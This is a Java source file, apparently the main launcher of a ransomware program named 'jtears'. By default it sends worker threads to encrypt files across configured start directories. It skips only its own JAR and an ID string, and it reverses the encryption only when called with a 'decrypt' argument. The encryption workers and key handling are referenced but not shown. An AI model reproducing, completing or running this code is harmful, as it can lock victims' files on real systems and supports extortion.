package oof.heck.jtears;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Future;
import java.util.LinkedList;
import java.io.File;
import javax.crypto.Cipher;
import java.lang.InterruptedException;
import java.util.concurrent.ExecutionException;

public class App
{

    private static final Logger logger = LoggerFactory.getLogger(App.class);

    private static ExecutorService executorService;

    public static void main( String[] args )
    {

        CryptoModel cm = CryptoModel.getInstance();

        executorService = Executors.newCachedThreadPool();

        String[] exemptions = new String[] { new File(App.class.getProtectionDomain()
                .getCodeSource()
                .getLocation()
                .getPath())
                .getName(),

                cm.getUUID()
        };

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < exemptions.length; i++) {

            sb.append(exemptions[i]).append((i == exemptions.length - 1 ? "" : ", "));

        }

        logger.info("Not operating on files containing: {}", sb.toString());

        LinkedList<Future<?>> futs = new LinkedList<Future<?>>();

        String action = (args.length > 0 ? args[0] : "");

        switch (action) {

            case "decrypt": {

                for (File f : cm.getStartDirs()) {

                    logger.debug("Starting crypto-worker at: {}", f.getAbsolutePath());
                    futs.add(executorService.submit(new CryptoWorker(f, exemptions, Cipher.DECRYPT_MODE)));

                }

                break;
            }

            default: {

                for (File f : cm.getStartDirs()) {

                    logger.debug("Starting crypto-worker at: {}", f.getAbsolutePath());
                    futs.add(executorService.submit(new CryptoWorker(f, exemptions, Cipher.ENCRYPT_MODE)));

                }

                break;
            }

        }

        try {

            for (Future<?> f : futs) {
                f.get();
            }

        }
        catch (InterruptedException | ExecutionException e) {

        }


    }
}
